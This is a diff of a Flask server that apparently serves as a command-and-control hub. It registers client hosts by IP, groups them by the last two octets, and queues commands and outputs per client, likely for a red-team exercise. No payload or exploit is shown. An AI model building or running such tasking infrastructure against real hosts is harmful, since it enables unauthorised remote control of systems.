@@ -10,12 +10,6 @@ SERVER_URL = "http://127.0.0.1:5005"
 app = Flask(__name__)
 print("Drew was here")
 
-#TODO: https?
-# feedback:
-# something something default route
-# document what im gonna send in input-command
-# fix groups to be based on last TWO octets (line 98)
-
 client_commands = {} # 'client_id': 'command', 'timestamp', 'output (default none)' --> to handle commands for specific clients
 clients = [] # just to see what clients we got rn
 groups = {} # for same box diff teams
@@ -65,7 +59,8 @@ def register_client():
     # client_id = request.remote_addr # ok just found out u could do this
     client_id = request.args.get('client_id') # retrieves the value associated with the key 'client_id' from the query string, or None if it does not exist
     # client_subnet = str(ip_network(f"{client_id}/24", strict=False))  # extract subnet (/24)
-    group = client_id.split('.')[-1] # last octet
+    # group = client_id.split('.')[-1] # last octet
+    group = client_id.split(".")[2] + "." + client_id.split(".")[3] # LAST 2 OCTETS
     if group not in groups:
         groups[group] = []
     if client_id not in groups:
@@ -95,7 +90,7 @@ def callbacks():
         toRet[group] = []
         for item in client_commands: # item = 'client_id': 'command', 'timestamp'
             # check to put IP in correct group
-            if item.split(".")[3] == group: # need to parse the last octet of client_id in item for check
+            if item.split(".")[2] + "." + item.split(".")[3] == group: # need to parse the last octet of client_id in item for check
                 fuck = {}
                 fuck[item] = client_commands[item]
                 toRet[group].append(fuck)
@@ -119,5 +114,5 @@ def sendUpdate(ips, name="leahfr"):
         return False
 
 if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=5005, threaded=True)
+    app.run(host='0.0.0.0', port=5005, threaded=True)
     # app.run(debug=True, host='127.0.0.1', port=5000, threaded=True)
